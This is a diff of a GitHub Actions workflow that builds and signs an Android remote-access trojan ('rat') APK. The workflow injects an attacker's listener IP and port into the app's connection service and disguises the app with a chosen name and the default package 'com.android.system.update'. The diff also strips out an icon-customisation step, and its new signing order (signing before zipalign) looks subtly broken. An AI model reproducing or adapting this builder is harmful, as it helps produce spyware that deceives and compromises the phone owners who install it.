@@ -19,14 +19,6 @@ on:
         description: 'Package Name (e.g., com.android.update)'
         required: true
         default: 'com.android.system.update'
-      icon_data:
-        description: 'Custom Icon Base64 Data (optional)'
-        required: false
-        default: ''
-      icon_extension:
-        description: 'Icon File Extension (png/jpg)'
-        required: false
-        default: 'png'
 
 jobs:
   build:
@@ -34,10 +26,10 @@ jobs:
     
     steps:
     - name: Checkout repository
-      uses: actions/checkout@v4
+      uses: actions/checkout@v3
 
     - name: Set up JDK 17
-      uses: actions/setup-java@v4
+      uses: actions/setup-java@v3
       with:
         java-version: '17'
         distribution: 'temurin'
@@ -55,207 +47,25 @@ jobs:
     - name: Update Configuration with Listener Details
       run: |
         # Update Constants.java with LHOST and LPORT
-        sed -i "s/SERVER_IP = \".*\"/SERVER_IP = \"${{ github.event.inputs.lhost }}\"/" app/src/main/java/com/fly0rakoon/rat/utils/Constants.java
-        sed -i "s/SERVER_PORT = .*/SERVER_PORT = ${{ github.event.inputs.lport }};/" app/src/main/java/com/fly0rakoon/rat/utils/Constants.java
-
-        # Update app name and package name
-        sed -i "s/android:label=\".*\"/android:label=\"${{ github.event.inputs.app_name }}\"/" app/src/main/AndroidManifest.xml
-        sed -i "s/package=\".*\"/package=\"${{ github.event.inputs.package_name }}\"/" app/src/main/AndroidManifest.xml
-
-    - name: Handle Custom Icon with Validation
-      if: ${{ github.event.inputs.icon_data != '' }}
-      run: |
-        echo "🎨 Processing custom icon with validation..."
+        sed -i "s/private static String SERVER_IP = \".*\";/private static String SERVER_IP = \"${{ github.event.inputs.lhost }}\";/" app/src/main/java/com/fly0rakoon/rat/services/ConnectionService.java
+        sed -i "s/private static int SERVER_PORT = .*;/private static int SERVER_PORT = ${{ github.event.inputs.lport }};/" app/src/main/java/com/fly0rakoon/rat/services/ConnectionService.java
         
-        # Create necessary resource directories
-        mkdir -p app/src/main/res/drawable
-        mkdir -p app/src/main/res/mipmap-hdpi
-        mkdir -p app/src/main/res/mipmap-mdpi
-        mkdir -p app/src/main/res/mipmap-xhdpi
-        mkdir -p app/src/main/res/mipmap-xxhdpi
-        mkdir -p app/src/main/res/mipmap-xxxhdpi
-        mkdir -p app/src/main/res/values
-        
-        # Decode base64 icon
-        ICON_DATA="${{ github.event.inputs.icon_data }}"
-        
-        # Remove data URL prefix if present
-        if [[ $ICON_DATA == data:image/* ]]; then
-          ICON_DATA=$(echo $ICON_DATA | sed 's/^data:image\/[a-zA-Z0-9]*;base64,//')
-          echo "✅ Extracted base64 from data URL"
+        # Update app name in strings.xml if it exists
+        if [ -f app/src/main/res/values/strings.xml ]; then
+          sed -i "s/<string name=\"app_name\">.*<\/string>/<string name=\"app_name\">${{ github.event.inputs.app_name }}<\/string>/" app/src/main/res/values/strings.xml
         fi
         
-        # Save raw decoded data to temp file
-        echo "$ICON_DATA" | base64 -d > /tmp/icon_raw.dat
+        # Remove package attribute from AndroidManifest.xml
+        sed -i 's/package="[^"]*"//' app/src/main/AndroidManifest.xml
         
-        # VALIDATION 1: Check file size
-        RAW_SIZE=$(wc -c < /tmp/icon_raw.dat)
-        echo "📊 Raw decoded size: $RAW_SIZE bytes"
+        # Update build.gradle with package name and namespace
+        sed -i "s/applicationId \".*\"/applicationId \"${{ github.event.inputs.package_name }}\"/" app/build.gradle
+        sed -i "s/namespace \".*\"/namespace \"${{ github.event.inputs.package_name }}\"/" app/build.gradle
         
-        if [ $RAW_SIZE -eq 0 ]; then
-          echo "❌ ERROR: Decoded icon is empty"
-          exit 1
+        # If namespace doesn't exist, add it after apply plugin
+        if ! grep -q "namespace" app/build.gradle; then
+          sed -i "/apply plugin: 'com.android.application'/a android {\n    namespace '${{ github.event.inputs.package_name }}'" app/build.gradle
         fi
-        
-        if [ $RAW_SIZE -gt 102400 ]; then  # 100KB limit
-          echo "❌ ERROR: Icon too large: $RAW_SIZE bytes (max 100KB)"
-          exit 1
-        fi
-        echo "✅ Size validation passed"
-        
-        # VALIDATION 2: Check file type using 'file' command
-        if command -v file &> /dev/null; then
-          FILE_TYPE=$(file -b /tmp/icon_raw.dat)
-          echo "🔍 Detected file type: $FILE_TYPE"
-          
-          # Check if it's a valid image format
-          if [[ $FILE_TYPE == *PNG* ]]; then
-            echo "✅ Valid PNG image detected"
-            cp /tmp/icon_raw.dat /tmp/icon_final.png
-          elif [[ $FILE_TYPE == *JPEG* ]] || [[ $FILE_TYPE == *JPG* ]]; then
-            echo "✅ Valid JPEG image detected, converting to PNG..."
-            # Convert JPEG to PNG using ImageMagick if available
-            if command -v convert &> /dev/null; then
-              convert /tmp/icon_raw.dat /tmp/icon_final.png
-              echo "✅ JPEG converted to PNG successfully"
-            else
-              echo "❌ ImageMagick not available to convert JPEG to PNG"
-              exit 1
-            fi
-          elif [[ $FILE_TYPE == *GIF* ]] || [[ $FILE_TYPE == *BMP* ]] || [[ $FILE_TYPE == *WEBP* ]]; then
-            echo "✅ Valid $FILE_TYPE image detected, converting to PNG..."
-            if command -v convert &> /dev/null; then
-              convert /tmp/icon_raw.dat /tmp/icon_final.png
-              echo "✅ Converted to PNG successfully"
-            else
-              echo "❌ ImageMagick not available to convert image"
-              exit 1
-            fi
-          else
-            echo "❌ ERROR: Not a valid image format. Detected: $FILE_TYPE"
-            echo "Supported formats: PNG, JPEG, GIF, BMP, WEBP"
-            exit 1
-          fi
-          echo "✅ Format validation passed"
-        else
-          # Fallback: just assume it's PNG and hope for the best
-          echo "⚠️ 'file' command not available, assuming PNG format"
-          cp /tmp/icon_raw.dat /tmp/icon_final.png
-        fi
-        
-        # VALIDATION 3: Verify PNG header
-        if [ -f /tmp/icon_final.png ]; then
-          # Check PNG header (first 8 bytes should be PNG signature)
-          echo "🔍 Checking PNG header integrity..."
-          PNG_HEADER=$(hexdump -n 8 -C /tmp/icon_final.png 2>/dev/null | head -1)
-          if echo "$PNG_HEADER" | grep -q "89 50 4E 47 0D 0A 1A 0A"; then
-            echo "✅ Valid PNG header confirmed"
-          else
-            echo "⚠️ PNG header not found, but continuing..."
-            echo "First 16 bytes for debugging:"
-            hexdump -n 16 -C /tmp/icon_final.png 2>/dev/null || echo "  Unable to read file"
-          fi
-        else
-          echo "❌ ERROR: Failed to create final icon file"
-          exit 1
-        fi
-        
-        # VALIDATION 4: Check image dimensions (requires ImageMagick)
-        if command -v identify &> /dev/null; then
-          echo "🔍 Checking image dimensions..."
-          DIMENSIONS=$(identify -format "%wx%h" /tmp/icon_final.png 2>/dev/null)
-          if [ $? -eq 0 ]; then
-            echo "📐 Image dimensions: $DIMENSIONS"
-            WIDTH=$(echo $DIMENSIONS | cut -d'x' -f1)
-            HEIGHT=$(echo $DIMENSIONS | cut -d'x' -f2)
-            
-            if [ $WIDTH -lt 48 ] || [ $HEIGHT -lt 48 ]; then
-              echo "⚠️ Warning: Image too small ($DIMENSIONS). Minimum 48x48 recommended."
-            else
-              echo "✅ Dimensions OK (≥48x48)"
-            fi
-          else
-            echo "⚠️ Could not determine image dimensions"
-          fi
-        fi
-        
-        # Create different sizes for different densities (Android best practice)
-        echo "🖼️ Creating density-specific icons..."
-        
-        # Create a temporary directory for resized icons
-        mkdir -p /tmp/android_icons
-        
-        if command -v convert &> /dev/null; then
-          # Generate icons for each density with proper sizing
-          echo "📱 Generating optimized icons for all screen densities..."
-          convert /tmp/icon_final.png -resize 48x48! /tmp/android_icons/ic_launcher_mdpi.png
-          convert /tmp/icon_final.png -resize 72x72! /tmp/android_icons/ic_launcher_hdpi.png
-          convert /tmp/icon_final.png -resize 96x96! /tmp/android_icons/ic_launcher_xhdpi.png
-          convert /tmp/icon_final.png -resize 144x144! /tmp/android_icons/ic_launcher_xxhdpi.png
-          convert /tmp/icon_final.png -resize 192x192! /tmp/android_icons/ic_launcher_xxxhdpi.png
-          
-          echo "✅ Created density-specific icons with forced dimensions"
-          
-          # Verify all icons were created
-          for size in mdpi hdpi xhdpi xxhdpi xxxhdpi; do
-            if [ -f "/tmp/android_icons/ic_launcher_${size}.png" ]; then
-              SIZE_KB=$(wc -c < "/tmp/android_icons/ic_launcher_${size}.png" | awk '{print $1/1024}')
-              echo "  ✓ ${size}: $(printf "%.1f" $SIZE_KB)KB"
-            fi
-          done
-        else
-          # If ImageMagick not available, use same image for all densities
-          echo "⚠️ ImageMagick not available - using same image for all densities"
-          cp /tmp/icon_final.png /tmp/android_icons/ic_launcher_mdpi.png
-          cp /tmp/icon_final.png /tmp/android_icons/ic_launcher_hdpi.png
-          cp /tmp/icon_final.png /tmp/android_icons/ic_launcher_xhdpi.png
-          cp /tmp/icon_final.png /tmp/android_icons/ic_launcher_xxhdpi.png
-          cp /tmp/icon_final.png /tmp/android_icons/ic_launcher_xxxhdpi.png
-        fi
-        
-        # Copy icons to appropriate directories
-        echo "📁 Installing icons to resource directories..."
-        cp /tmp/android_icons/ic_launcher_mdpi.png app/src/main/res/mipmap-mdpi/ic_launcher.png
-        cp /tmp/android_icons/ic_launcher_hdpi.png app/src/main/res/mipmap-hdpi/ic_launcher.png
-        cp /tmp/android_icons/ic_launcher_xhdpi.png app/src/main/res/mipmap-xhdpi/ic_launcher.png
-        cp /tmp/android_icons/ic_launcher_xxhdpi.png app/src/main/res/mipmap-xxhdpi/ic_launcher.png
-        cp /tmp/android_icons/ic_launcher_xxxhdpi.png app/src/main/res/mipmap-xxxhdpi/ic_launcher.png
-        
-        # Also copy as round icons (same image for simplicity)
-        cp app/src/main/res/mipmap-mdpi/ic_launcher.png app/src/main/res/mipmap-mdpi/ic_launcher_round.png
-        cp app/src/main/res/mipmap-hdpi/ic_launcher.png app/src/main/res/mipmap-hdpi/ic_launcher_round.png
-        cp app/src/main/res/mipmap-xhdpi/ic_launcher.png app/src/main/res/mipmap-xhdpi/ic_launcher_round.png
-        cp app/src/main/res/mipmap-xxhdpi/ic_launcher.png app/src/main/res/mipmap-xxhdpi/ic_launcher_round.png
-        cp app/src/main/res/mipmap-xxxhdpi/ic_launcher.png app/src/main/res/mipmap-xxxhdpi/ic_launcher_round.png
-        
-        # Clean up temp files
-        rm -rf /tmp/icon_raw.dat /tmp/icon_final.png /tmp/android_icons
-        
-        # Final verification
-        echo "🔍 Performing final verification..."
-        if [ -f app/src/main/res/mipmap-hdpi/ic_launcher.png ]; then
-          FINAL_SIZE=$(wc -c < app/src/main/res/mipmap-hdpi/ic_launcher.png)
-          echo "✅ Icon files installed successfully (HDPI size: $FINAL_SIZE bytes)"
-          ls -la app/src/main/res/mipmap-hdpi/ic_launcher.png
-        else
-          echo "❌ ERROR: Icon files not installed correctly"
-          exit 1
-        fi
-        
-        # Verify AndroidManifest.xml has correct icon references
-        echo "📝 Checking AndroidManifest.xml..."
-        if grep -q "android:icon=\"@mipmap/ic_launcher\"" app/src/main/AndroidManifest.xml; then
-          echo "✅ AndroidManifest.xml already has correct icon references"
-        else
-          echo "⚠️ Adding icon references to AndroidManifest.xml"
-          # Backup original manifest
-          cp app/src/main/AndroidManifest.xml app/src/main/AndroidManifest.xml.bak
-          # Add icon references
-          sed -i '0,/<application/s//<application android:icon="@mipmap\/ic_launcher" android:roundIcon="@mipmap\/ic_launcher_round"/' app/src/main/AndroidManifest.xml
-          echo "✅ Updated AndroidManifest.xml with icon references"
-        fi
-        
-        echo "🎉 Custom icon processing completed successfully!"
 
     - name: Build APK
       run: |
@@ -266,23 +76,16 @@ jobs:
       run: |
         # Generate keystore for signing
         keytool -genkey -v -keystore release.keystore -alias ratkey -keyalg RSA -keysize 2048 -validity 10000 -storepass 123456 -keypass 123456 -dname "CN=Unknown, OU=Unknown, O=Unknown, L=Unknown, ST=Unknown, C=Unknown"
-
-        # First, align the APK (zipalign must be done BEFORE signing)
-        $ANDROID_HOME/build-tools/33.0.0/zipalign -v -p 4 app/build/outputs/apk/release/app-release-unsigned.apk app/build/outputs/apk/release/app-release-aligned.apk
-
-        # Sign the APK with apksigner
-        $ANDROID_HOME/build-tools/33.0.0/apksigner sign --ks release.keystore --ks-pass pass:123456 --key-pass pass:123456 --out app/build/outputs/apk/release/app-release-signed.apk app/build/outputs/apk/release/app-release-aligned.apk
-
-        # Verify the signature
-        $ANDROID_HOME/build-tools/33.0.0/apksigner verify --verbose app/build/outputs/apk/release/app-release-signed.apk
-
-        # Copy to final name with app_name and lhost
-        cp app/build/outputs/apk/release/app-release-signed.apk ${{ github.event.inputs.app_name }}_${{ github.event.inputs.lhost }}.apk
+        
+        # Sign the APK
+        $ANDROID_HOME/build-tools/33.0.0/apksigner sign --ks release.keystore --ks-pass pass:123456 --key-pass pass:123456 app/build/outputs/apk/release/app-release-unsigned.apk
+        
+        # Align and rename
+        $ANDROID_HOME/build-tools/33.0.0/zipalign -v -p 4 app/build/outputs/apk/release/app-release-unsigned.apk ${{ github.event.inputs.app_name }}_${{ github.event.inputs.lhost }}.apk
 
     - name: Upload APK Artifact
-      uses: actions/upload-artifact@v4
+      uses: actions/upload-artifact@v3
       with:
         name: rat-apk
         path: ${{ github.event.inputs.app_name }}_${{ github.event.inputs.lhost }}.apk
         retention-days: 1
-        if-no-files-found: error
